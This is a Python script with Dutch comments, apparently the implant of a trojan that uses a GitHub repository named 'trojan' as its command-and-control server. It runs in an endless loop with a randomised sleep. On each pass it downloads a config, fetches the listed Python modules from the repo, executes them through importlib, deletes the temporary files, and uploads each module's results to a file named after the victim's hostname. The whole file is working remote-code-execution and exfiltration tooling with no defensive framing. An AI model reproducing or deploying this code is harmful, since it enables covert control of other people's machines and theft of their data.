import os
import json
import random
import time
import importlib.util
import requests
import socket
import base64
from config import GITHUB_TOKEN

# Haal de hostname van het systeem op
hostname = socket.gethostname()

# Configuratie van de GitHub-repository
GITHUB_REPO = "https://api.github.com/repos/GerbenVandeVelde/trojan"  # Vervang met jouw repo
ACCESS_TOKEN = f"token {GITHUB_TOKEN}"  # Voeg je eigen token toe
CLIENT_ID = hostname

# Basisheaders voor API-verzoeken
HEADERS = {
    "Authorization": f"token {ACCESS_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

def fetch_config():
    """Downloadt het configuratiebestand van de GitHub-repo."""
    try:
        url = f"{GITHUB_REPO}/contents/config/config.json"
        response = requests.get(url, headers=HEADERS)
        if response.status_code == 200:
            content = response.json()["content"]
            decoded_content = base64.b64decode(content).decode("utf-8")
            config = json.loads(decoded_content)
            return config
        else:
            print(f"Fout bij ophalen van configuratie: {response.status_code}")
            return {}
    except Exception as e:
        print(f"Fout bij verwerken van configuratie: {e}")
        return {}

def fetch_module(module_name):
    """Downloadt de module van GitHub."""
    try:
        url = f"{GITHUB_REPO}/contents/modules/{module_name}.py"
        response = requests.get(url, headers=HEADERS)
        if response.status_code == 200:
            encoded_content = response.json()["content"]
            decoded_content = base64.b64decode(encoded_content).decode("utf-8")
            temp_path = f"temp_{module_name}.py"
            with open(temp_path, "w") as module_file:
                module_file.write(decoded_content)
            return temp_path
        else:
            print(f"Fout bij ophalen van module {module_name}: {response.status_code}")
            return None
    except Exception as e:
        print(f"Fout bij ophalen van module {module_name}: {e}")
        return None

def execute_module(module_path):
    """Voert de gedownloade module uit."""
    try:
        spec = importlib.util.spec_from_file_location("module", module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        result = module.run()  # Veronderstelt dat elke module een `run()`-functie heeft
        os.remove(module_path)  # Verwijder het tijdelijke modulebestand
        return result
    except Exception as e:
        print(f"Fout bij uitvoeren van module {module_path}: {e}")
        return {"status": "error", "error_message": str(e)}

def send_results(data):
    """Uploadt resultaten van een module naar de GitHub-repository."""
    file_path = f"data/{CLIENT_ID}.json"
    url = f"{GITHUB_REPO}/contents/{file_path}"
    try:
        response = requests.get(url, headers=HEADERS)
        sha = response.json()["sha"] if response.status_code == 200 else None

        existing_data = []
        if sha:
            existing_content = response.json().get("content", "")
            decoded_content = base64.b64decode(existing_content).decode("utf-8")
            existing_data = json.loads(decoded_content)

        existing_data.append(data)
        encoded_content = base64.b64encode(json.dumps(existing_data).encode("utf-8")).decode("utf-8")
        payload = {"message": "Update module results", "content": encoded_content, "sha": sha}

        response = requests.put(url, headers=HEADERS, json=payload)
        if response.status_code in [200, 201]:
            print("Resultaten succesvol geüpload.")
        else:
            print(f"Fout bij uploaden: {response.status_code}")
    except Exception as e:
        print(f"Fout bij uploaden van resultaten naar GitHub: {e}")

def main():
    """Hoofdcontrolelus van het script."""
    while True:
        config = fetch_config()
        if not config.get("modules"):
            print("Geen actieve modules. Systeem slaapt...")
        else:
            for module_name in config["modules"]:
                print(f"Uitvoeren van module: {module_name}")
                module_path = fetch_module(module_name)
                if module_path:
                    results = execute_module(module_path)
                    send_results({module_name: results})

        sleep_time = random.randint(30, 120)
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
